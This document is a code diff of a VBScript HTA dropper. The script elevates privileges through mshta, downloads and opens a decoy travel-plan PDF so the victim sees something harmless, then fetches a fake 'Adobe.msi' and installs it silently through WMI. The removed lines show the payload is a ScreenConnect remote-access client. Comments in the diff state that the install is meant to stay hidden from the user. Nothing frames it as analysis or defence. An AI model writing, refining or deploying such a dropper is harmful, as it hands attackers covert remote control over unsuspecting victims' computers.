@@ -1,28 +1,17 @@
-Dim fso, sh, qs, tmp, selfPath, isAdmin, log
+Dim fso, sh, qs, tmp, selfPath, isAdmin
 Dim http, stream, msiUrl, msiPath, pid
 Dim wmiSvc, procClass, startup, cmdLine
 Dim pdfUrl, pdfPath, ph, ps
-Dim msiErr, pdfErr, wmiErr
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 qs  = Chr(34)
-tmp = sh.ExpandEnvironmentStrings("%TEMP%")
-log = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\stage2_debug.txt"
-
-Dim f
-Set f = fso.CreateTextFile(log, True)
-f.WriteLine "=== stage2 run start ==="
-f.WriteLine "time       : " & Now
-f.WriteLine "user       : " & sh.ExpandEnvironmentStrings("%USERNAME%")
-f.WriteLine "tmp        : " & tmp
-f.WriteLine "tmp exists : " & fso.FolderExists(tmp)
+tmp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
 
 selfPath = location.href
 selfPath = Replace(selfPath, "file:///", "")
 selfPath = Replace(selfPath, "%20", " ")
 selfPath = Replace(selfPath, "/", "\")
-f.WriteLine "selfPath   : " & selfPath
 
 isAdmin = True
 On Error Resume Next
@@ -31,31 +20,25 @@ If Err.Number <> 0 Then isAdmin = False
 Err.Clear
 On Error GoTo 0
 If isAdmin Then sh.RegDelete "HKLM\SOFTWARE\Microsoft\_a"
-f.WriteLine "isAdmin    : " & isAdmin
 
 If Not isAdmin Then
-    f.WriteLine "-> elevating via mshta runas"
-    f.Close
     CreateObject("Shell.Application").ShellExecute "mshta.exe", qs & selfPath & qs, "", "runas", 1
     self.close
 End If
 
-f.WriteLine "-> elevated. proceeding with payload."
+' ============================================================
+'  Elevated. PDF opens FIRST so the user has something to see.
+' ============================================================
 
-' ---------- PDF ----------
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
-f.WriteLine "pdf fetch  : " & pdfUrl
 On Error Resume Next
 Set ph = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 ph.open "GET", pdfUrl, False
 ph.send
 On Error GoTo 0
-f.WriteLine "pdf status : " & ph.status
-f.WriteLine "pdf body   : " & Len(ph.responseBody) & " bytes"
 
-pdfErr = ""
 If ph.status = 200 Then
     On Error Resume Next
     Set ps = CreateObject("ADODB.Stream")
@@ -63,41 +46,29 @@ If ph.status = 200 Then
     ps.Open
     ps.Write ph.responseBody
     ps.SaveToFile pdfPath, 2
-    If Err.Number <> 0 Then
-        pdfErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     ps.Close
     On Error GoTo 0
-    f.WriteLine "pdf saveerr: " & pdfErr
-
     If fso.FileExists(pdfPath) Then
-        f.WriteLine "pdf saved  : " & fso.GetFile(pdfPath).Size & " bytes"
         CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
-        f.WriteLine "pdf opened"
-    Else
-        f.WriteLine "pdf saved  : FALSE"
     End If
 End If
 
-f.WriteLine "-> settling 3s"
-sh.Run "%COMSPEC% /c timeout /t 3 /nobreak >nul", 0, True
+' ============================================================
+'  PDF is now on screen. Do the MSI fetch + install in background.
+'  User sees: PDF opens. No visible pause. Install is silent.
+' ============================================================
 
-' ---------- MSI ----------
+WScript.Sleep 3000
+
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
 msiPath = tmp & "\Adobe.msi"
 
-f.WriteLine "msi fetch  : " & msiUrl
-f.WriteLine "msi path   : " & msiPath
 On Error Resume Next
 Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 http.open "GET", msiUrl, False
 http.send
 On Error GoTo 0
-f.WriteLine "msi status : " & http.status
-f.WriteLine "msi body   : " & Len(http.responseBody) & " bytes"
 
-msiErr = ""
 If http.status = 200 Then
     On Error Resume Next
     Set stream = CreateObject("ADODB.Stream")
@@ -105,67 +76,22 @@ If http.status = 200 Then
     stream.Open
     stream.Write http.responseBody
     stream.SaveToFile msiPath, 2
-    If Err.Number <> 0 Then
-        msiErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    End If
     stream.Close
     On Error GoTo 0
-    f.WriteLine "msi saveerr: " & msiErr
-
-    If fso.FileExists(msiPath) Then
-        f.WriteLine "msi saved  : " & fso.GetFile(msiPath).Size & " bytes"
-    Else
-        f.WriteLine "msi saved  : FALSE"
-    End If
 End If
 
-' ---------- spawn msiexec ----------
 If fso.FileExists(msiPath) Then
-    f.WriteLine "-> spawning msiexec via WMI"
-    wmiErr = ""
-    On Error Resume Next
-    Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
-    If Err.Number <> 0 Then
-        wmiErr = Err.Number & " - " & Err.Description
-        Err.Clear
-    Else
-        Set procClass = wmiSvc.Get("Win32_Process")
-        Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
-        startup.ShowWindow = 0
-        cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1 /L*v " & qs & tmp & "\msi_install.log" & qs
-        procClass.Create cmdLine, Null, startup, pid
-        If Err.Number <> 0 Then
-            wmiErr = Err.Number & " - " & Err.Description
-            Err.Clear
-        Else
-            f.WriteLine "wmi create : spawned pid " & pid
-        End If
-    End If
-    On Error GoTo 0
-    f.WriteLine "wmi err    : " & wmiErr
-Else
-    f.WriteLine "-> skipped msiexec spawn (msi not on disk)"
+    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
+    Set procClass = wmiSvc.Get("Win32_Process")
+    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
+    startup.ShowWindow = 0
+    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1"
+    procClass.Create cmdLine, Null, startup, pid
 End If
 
-f.WriteLine "-> waiting 60s for install"
-sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul", 0, True
-
-' ---------- checks ----------
-Dim probe, svcCheck, installLog
-probe = "C:\Program Files (x86)\ScreenConnect Client"
-svcCheck = fso.FolderExists(probe)
-f.WriteLine "install chk: ScreenConnect folder = " & svcCheck
-
-installLog = tmp & "\msi_install.log"
-If fso.FileExists(installLog) Then
-    f.WriteLine "msi log    : found, size = " & fso.GetFile(installLog).Size
-Else
-    f.WriteLine "msi log    : NOT FOUND"
-End If
-
-f.WriteLine "msi final  : exists = " & fso.FileExists(msiPath)
-f.WriteLine "=== end ==="
-f.Close
+' ============================================================
+'  Cleanup: give the install time to finish, then remove the MSI.
+'  mshta process can close now — msiexec runs independently.
+' ============================================================
 
 self.close
